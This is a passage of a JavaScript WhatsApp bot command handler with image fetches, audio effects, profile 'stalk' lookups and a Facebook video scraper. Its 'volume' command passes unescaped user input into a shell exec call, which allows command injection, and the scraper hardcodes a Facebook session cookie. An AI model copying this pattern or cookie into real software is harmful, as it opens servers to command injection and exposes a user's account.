 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            await TradzSigma.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animetickle': {
replyviex(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            await TradzSigma.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animegecg': {
replyviex(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            await TradzSigma.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'dogwoof': {
replyviex(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            await TradzSigma.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case '8ballpool': {
replyviex(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            await TradzSigma.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'goosebird': {
replyviex(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            await TradzSigma.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animefeed': {
replyviex(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            await TradzSigma.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeavatar': {
replyviex(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await TradzSigma.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'lizardpic': {
replyviex(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            await TradzSigma.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'catmeow': {
replyviex(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            await TradzSigma.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
    case 'igemoji': 
case 'instagramemoji': 
if (!q) return replyviex("Enter emoji, maximum 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyviex(mess.wait)
emote(q, "11")
break
case 'iphoneemoji': 
if (!q) return replyviex("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyviex(mess.wait)
emote(q, "0")
break
case 'googleemoji': 
if (!q) return replyviex("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyviex(mess.wait)
emote(q, "1")
break
case 'samsungemoji': 
if (!q) return replyviex("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyviex(mess.wait)
emote(q, "2")
break
case 'microsoftemoji': 
if (!q) return replyviex("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyviex(mess.wait)
emote(q, "3")
break
case 'whatsappemoji': 
if (!q) return replyviex("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyviex(mess.wait)
emote(q, "4")
break
case 'twitteremoji': 
if (!q) return replyviex("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyviex(mess.wait)
emote(q, "5")
break
case 'facebookemoji': 
case 'fbemoji': 
if (!q) return replyviex("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyviex(mess.wait)
emote(q, "6")
break
case 'skypeemoji': 
if (!q) return replyviex("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyviex(mess.wait)
emote(q, "7")
break
case 'joyemoji': 
if (!q) return replyviex("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyviex(mess.wait)
emote(q, "8")
break
case 'mojiemoji': 
if (!q) return replyviex("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyviex(mess.wait)
emote(q, "9")
case 'pediaemoji': 
if (!q) return replyviex("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replyviex(mess.wait)
emote(q, "10")
break
case 'emoji': {
if (!args.join(" ")) return replyviex('Where is the emoji?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await TradzSigma.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Made by ${global.namabot}`}, {quoted:m})
await TradzSigma.sendMessage(from, {text:"reply #s to this image to make sticker"}, {quoted:mese})
})
}
break
case 'volume': {
if (!args.join(" ")) return replyviex(`Contoh: ${prefix + command} 10`)
media = await TradzSigma.downloadAndSaveMediaMessage(quoted, "volume")
if (isQuotedAudio) {
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replyviex('Error!')
jadie = fs.readFileSync(rname)
TradzSigma.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
} else if (isQuotedVideo) {
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replyviex('Error!')
jadie = fs.readFileSync(rname)
TradzSigma.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
} else {
replyviex("Send video/audio")
}
}
break
 case 'tinyurl':{
   if(!q) return replyviex('link?')
   const request = require('request')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  replyviex(body)
  } catch (e) {
  replyviex(e)
  }
  })
  }
 break
case 'git': case 'gitclone': {
if (!args[0]) return replyviex(`Where is the link?\nContoh :\n${prefix}${command} https://github.com/DGXeon/XeonMedia`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replyviex(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    TradzSigma.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replyviex(mess.error))
}
break
case 'spotify0': case 'spotifysearch0': case 'spotifys0': {
    if (!text) return reply('Masukan judul lagu!');
    let result = await searchSpotify(text);
    if (!result || result.length === 0) return reply('Lagu tidak ditemukan.');
    let caption = `🎵 *Hasil Pencarian Spotify*\n📌 _Keyword_: *${text}*\n\n`;
    caption += result.map((v, i) => {
        return `*${i + 1}. ${v.name}*\n   🎤 *Artist*: ${v.artist || 'Unknown'}\n   🔗 *Link*: ${v.link}`;
    }).join('\n\n');
    caption += `\n\n✨ *Pilih dan salin link terus  ketik spdl untuk mendownload audionya*`;
    reply(caption);
}
break;

case 'spdl0': case 'spotifydl0': {
if (!text) return reply('Masukan Link')
let result = await spotifydl(text)
let captionvid = `∘ Title: ${result.title}\n∘ Artist: ${result.artis}\n∘ Type: ${result.type}\n\nDinzID Chx`
 const p = await new canvafy.Spotify()
            .setTitle(result.title)
            .setAuthor("Spotify - Downloader")
            .setTimestamp(40, 100)
            .setOverlayOpacity(0.8)
            .setBorder("#fff", 0.8)
            .setImage(result.image)
            .setBlur(3)
            .build(); 

       await TradzSigma.sendMessage(from, { image: p, caption: captionvid }, { quoted: m })
    TradzSigma.sendMessage(m.chat, { audio: { url: result.download}, mimetype: 'audio/mpeg', filename: 'MP3 BY ' + 'DinzID Chx' }, { quoted: m });
}
break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
    try {
        let set;
        if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';
        else if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';
        else if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';
        else if (/earrape/.test(command)) set = '-af volume=12';
        else if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';
        else if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';
        else if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25';
        else if (/reverse/.test(command)) set = '-filter_complex "areverse"';
        else if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';
        else if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"';
        else if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';
        else if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"';
        if (set) {
            if (/audio/.test(mime)) {
                await replyviex(mess.wait);
                let media = await TradzSigma.downloadAndSaveMediaMessage(quoted);
                let ran = getRandom('.mp3');
                console.log(`Running ffmpeg command: ffmpeg -i ${media} ${set} ${ran}`);
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(media);
                    if (err) {
                        console.error(`ffmpeg error: ${err}`);
                        return replyviex(err);
                    }
                    
                    let buff = fs.readFileSync(ran);
                    TradzSigma.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: m });
                    fs.unlinkSync(ran);
                });
            } else {
                replyviex(`Reply to the audio you want to change with a caption *${prefix + command}*`);
            }
        } else {
            replyviex('Invalid command');
        }
    } catch (e) {
        replyviex(e);
    }
    break
case 'define': 
if (!q) return replyviex(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replyviex(mess.error)
let reply =`
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   TradzSigma.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
    return replyviex(`*${q}* isn't a valid text`)
    }
    break
case 'chhgan': {
            	if (!text) return replyviex(`Ask question\n\nContoh : ${prefix + command} i dance?`)
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
let keh = bisa[Math.floor(Math.random() * bisa.length)]
let jawab = `*Can ${text}*\nAnswer : ${keh}`
            await replyviex(jawab)
            }
            break
            case 'ighas': {
            	if (!text) return replyviex(`Ask question\n\nContoh : ${prefix + command} she virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
let kah = apa[Math.floor(Math.random() * apa.length)]
let jawab = `*Is ${text}*\nAnswer : ${kah}`
            await replyviex(jawab)
            }
            break
            case 'wheggdfen': {
            	if (!text) return replyviex(`Ask question\n\nContoh : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
let koh = kapan[Math.floor(Math.random() * kapan.length)]
let jawab = `*${command} ${text}*\nAnswer : ${koh}`
            await replyviex(jawab)
            }
            break
case 'whadfffdt': {
            	if (!text) return replyviex(`Ask question\n\nContoh : ${prefix + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
let kah = lel[Math.floor(Math.random() * lel.length)]
let jawab = `*What ${text}*\nAnswer : ${kah}`
            await replyviex(jawab)
            }
            break
case 'wheddfrfre': {
if (!text) return replyviex(`Ask question\n\nContoh : ${prefix + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
            await replyviex(jawab)
            }
            break
case 'hohyyw': {
            	if (!text) return replyviex(`Ask question\n\nContoh : ${prefix + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
let kah = gimana[Math.floor(Math.random() * gimana.length)]
let jawab = `*How ${text}*\nAnswer : ${kah}`
            await replyviex(jawab)
            }
            break
case 'raddrdte': {
            	if (!text) return replyviex(`Contoh : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
let kah = ra[Math.floor(Math.random() * ra.length)]
let jawab = `*Rate ${text}*\nAnswer : ${kah}%`
            await replyviex(jawab)
            }
            break
            case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
replyviex(lowq)
            	}
            break
            case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
TradzSigma.sendMessage(m.chat, { text: xeonkak }, { quoted: m })
break
           case 'jodoh':
            case 'jodohku': {
            if (!m.isGroup) return reply(mess.only.group)
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
TradzSigma.sendMessage(m.chat,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.namabot}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnailUrl": 'https://telegra.ph/file/49f2b139a2aff4bb934f7.jpg',
"sourceUrl": `${linkSaluran}`}}},
{ quoted: m})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return reply(mess.only.group)
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
TradzSigma.sendMessage(m.chat,
{ text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Cieeee, What's Going On❤️💖👀`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.namabot}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
thumbnailUrl: global.thumbnail,
"sourceUrl": `${linkSaluran}`}}},
{ quoted: m})        
            }
            break
    case 'coffee': case 'kopi': {
TradzSigma.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break
            case 'wallpaper': {
if (!text) return replyviex('Enter Query Title')
replyviex(mess.wait)
		let { wallpaper } = require('./lib/scraper')
anuwallpep = await wallpaper(text)
result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]
TradzSigma.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
            }
            break
            case 'wikimedia': {
if (!text) return replyviex('Enter Query Title')
replyviex(mess.wait)
		let { wikimedia } = require('./lib/scraper')
let anumedia = await wikimedia(text)
result = anumedia[Math.floor(Math.random() * anumedia.length)]
TradzSigma.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
            }
            break
            case 'pick': {
            	if (!m.isGroup) return reply(mess.only.group)
            	if (!text) return replyviex(`What do you want to pick?\nContoh: ${prefix + command} idiot`)
             const groupMetadata = m.isGroup ? await TradzSigma.groupMetadata(m.chat)
 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let xeonshimts = member[Math.floor(Math.random() * member.length)]
             TradzSigma.sendMessage(from, { 
text: `The most *${text}* here is *@${xeonshimts.split("@")[0]}*`,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[xeonshimts],
"externalAdReply": {
"showAdAttribution": true,
"title": ` ${global.namabot}`,
"body": `${ownername}`,
"containsAutoReply": true,
"previewType": "PHOTO",
"thumbnailUrl": ``,
thumbnailUrl: global.thumbnail,
"sourceUrl": `${linkSaluran}`
}
}
}, { quoted: m })
         }
     break
case 'instagramstalk':
case 'igstalk': {
if (!text) return replyviex(`Enter Instagram Username\n\nContoh: ${prefix + command} DinzDinzID`)
TradzSigma.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
    try {
const dat = await fetchJson(`https://api.vreden.web.id/api/igstalk?query=${text}`);
if (!dat || !dat.result) {
    return TradzSigma.sendMessage(m.chat, { text: "Data tidak ditemukan atau API error." }, { quoted: m });
}
const data = dat.result;
const data1 = dat.result.stats;
const te = `
┌──「 *STALKING* 」
▢ *🔖Name:* ${data.fullName} 
▢ *🔖Username:* ${data.username.replace(/^@/, '')}
▢ *👥Follower:* ${data1.followers}
▢ *🫂Following:* ${data1.following}
▢ *📌Bio:* ${data.bio}
▢ *🏝️Posts:* ${data1.posts}
▢ *🔗 Link:* https://instagram.com/${data.username.replace(/^@/, '')}
└────────────`;
await TradzSigma.sendMessage(m.chat, { image: { url: data.profilePic }, caption: te }, { quoted: m });
      } catch {
        replyviex(`Pastikan nama pengguna berasal dari *Instagram*`)
      }
}
break
case 'tiktokstalk': case 'ttstalk': {
    if (!text) return reply(`Example: ${prefix + command} username`);
    try {
        let api = await fetch(`https://api-rest-rizzkyxofc.vercel.app/api/tools/tiktokstalk?user=${text}`);
        let data = await api.json();
        if (!data.status) return reply('User not found!');
        let caption = `乂 *TIKTOK STALK*

 *🔖 Name* : ${data.result.nama}
 *🔍 Username* : ${data.result.user}
 *✨ Bio* : ${data.result.bio}
 *👥 Followers* : ${data.result.followers}
 *👤 Following* : ${data.result.following}
 *🔒 Private* : ${data.result.privatemode ? 'Yes' : 'No'}`;
        await TradzSigma.sendMessage(m.chat, { 
            image: { url: data.result.profile },
            caption: caption 
        });
    } catch (e) {
        console.log(e);
        reply('Error occurred while fetching data!');
    }
}
break
case 'fb':
case 'fbdl':
case 'facebook':
case 'facebookvid': {
if (!text)  return replyviex(`Silakan kirimkan tautan video Facebook\n\nCONTOH :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`) 
reply('tunggu sebentar ya..')
  try {
  const getFBInfo = (videoUrl) => {
  const axios = require("axios");
  const headers = {
    "sec-fetch-user": "?1",
    "sec-ch-ua-mobile": "?0",
    "sec-fetch-site": "none",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "cache-control": "max-age=0",
    authority: "www.facebook.com",
    "upgrade-insecure-requests": "1",
    "accept-language": "en-GB,en;q=0.9,tr-TR;q=0.8,tr;q=0.7,en-US;q=0.6",
    "sec-ch-ua": '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
    accept:
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    cookie: "sb=Rn8BYQvCEb2fpMQZjsd6L382; datr=Rn8BYbyhXgw9RlOvmsosmVNT; c_user=100003164630629; _fbp=fb.1.1629876126997.444699739; wd=1920x939; spin=r.1004812505_b.trunk_t.1638730393_s.1_v.2_; xs=28%3A8ROnP0aeVF8XcQ%3A2%3A1627488145%3A-1%3A4916%3A%3AAcWIuSjPy2mlTPuZAeA2wWzHzEDuumXI89jH8a_QIV8; fr=0jQw7hcrFdas2ZeyT.AWVpRNl_4noCEs_hb8kaZahs-jA.BhrQqa.3E.AAA.0.0.BhrQqa.AWUu879ZtCw",
  };
  const parseString = (string) => JSON.parse(`{"text": "${string}"}`).text;
  return new Promise((resolve, reject) => {
    if (!videoUrl || !videoUrl.trim()) return reject("Please specify the Facebook URL");
    if (
      ["facebook.com", "fb.watch"].every((domain) => !videoUrl.includes(domain))
    ) return reject("Please enter the valid Facebook URL");
    axios.get(videoUrl, { headers }).then(({ data }) => {
      data = data.replace(/&quot;/g, '"').replace(/&amp;/g, "&");
      const sdMatch = data.match(/"browser_native_sd_url":"(.*?)"/) || data.match(/"playable_url":"(.*?)"/) || data.match(/sd_src\s*:\s*"([^"]*)"/) || data.match(/(?<="src":")[^"]*(https:\/\/[^"]*)/);
      const hdMatch = data.match(/"browser_native_hd_url":"(.*?)"/) || data.match(/"playable_url_quality_hd":"(.*?)"/) || data.match(/hd_src\s*:\s*"([^"]*)"/);
      const titleMatch = data.match(/<meta\sname="description"\scontent="(.*?)"/);
      const thumbMatch = data.match(/"preferred_thumbnail":{"image":{"uri":"(.*?)"/);
			
			// @TODO:
      if (sdMatch && sdMatch[1]) {
        const result = {
          url: videoUrl,
          sd: parseString(sdMatch[1]),
          hd: hdMatch && hdMatch[1] ? parseString(hdMatch[1]) : "",
          title: titleMatch && titleMatch[1] ? parseString(titleMatch[1]) : data.match(/<title>(.*?)<\/title>/)?.[1] ?? "",
          thumbnail: thumbMatch && thumbMatch[1] ? parseString(thumbMatch[1]) : "",
        };

        resolve(result);
      } else reject("Unable to fetch video information at this time. Please try again");
    }).catch(_ => reject("Unable to fetch video information at this time. Please try again"));
  });
};
const hasilny = await getFBInfo(text)
let vd = `*${hasilny.title}*`
await TradzSigma.sendMessage(m.chat, {video: {url: hasilny.sd}, caption: vd})
  } catch (error) {
    replyviex('Yah error kak')
  }
  }
  break
//=========================================\\
    case 'say': case 'tts': case 'gtts':{
if (!text) return replyviex('Where is the text?')
            let texttts = text
            const xeonrl = googleTTS.getAudioUrl(texttts, {
                lang: "ID",
                slow: false,
                host: "https://translate.google.com",
            })
            return TradzSigma.sendMessage(m.chat, {
                audio: {
                    url: xeonrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`,
            }, {
                quoted: m,
            })
        }
        break
        
    case 'fact': {
    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
        return replyviex(`${themeemoji} *Fact:* ${data.fact}\n`)   
    }
    break
    
case 'aimage': {
try {
  if (!isPrem) return replyprem(mess.premium)
if (global.keyopenai === '') return replyviex("Apike Anda Limit");
if (!q) return replyviex(`Generate image from AI.\n\nContoh:\n${prefix + command} Cowok Naik Kuda`)
const { Configuration, OpenAIApi } = require('openai')
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createImage({
prompt: text,
n: 1,
size: "512x512",
});
//console.log(response.data.data[0].url)
TradzSigma.sendImage(from, response.data.data[0].url, text, m);
} catch (err) {
console.log(err);
replyviex("Sorry, there seems to be an error :"+ err);
}
}
break

case 'nomerhoki': case 'nomorhoki': {
if (!Number(text)) return reply(`Contoh : ${prefix + command} 6283182739135`)
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return reply(anu.message)
reply(`• *Nomor HP :* ${anu.message.nomer_hp}\n• *Angka Shuzi :* ${anu.message.angka_shuzi}\n• *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n• *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`)
}
break
case 'artimimpi': case 'tafsirmimpi': {
if (!text) return reply(`Contoh : ${prefix + command} belanja`)
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return reply(anu.message)
reply(`• *Mimpi :* ${anu.message.mimpi}\n• *Arti :* ${anu.message.arti}\n• *Solusi :* ${anu.message.solusi}`)
}
break
case 'ramalanjodoh': case 'ramaljodoh': {
if (!text) return reply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalanjodohbali': case 'ramaljodohbali': {
if (!text) return reply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'suamiistri': {
if (!text) return reply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Suami :* ${anu.message.suami.nama}\n• *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n• *Nama Istri :* ${anu.message.istri.nama}\n• *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalancinta': case 'ramalcinta': {
if (!text) return reply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'artinama': {
if (!text) return reply(`Contoh : ${prefix + command} Dika Ardianta`)
let anu = await primbon.arti_nama(text)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'kecocokannama': case 'cocoknama': {
if (!text) return reply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
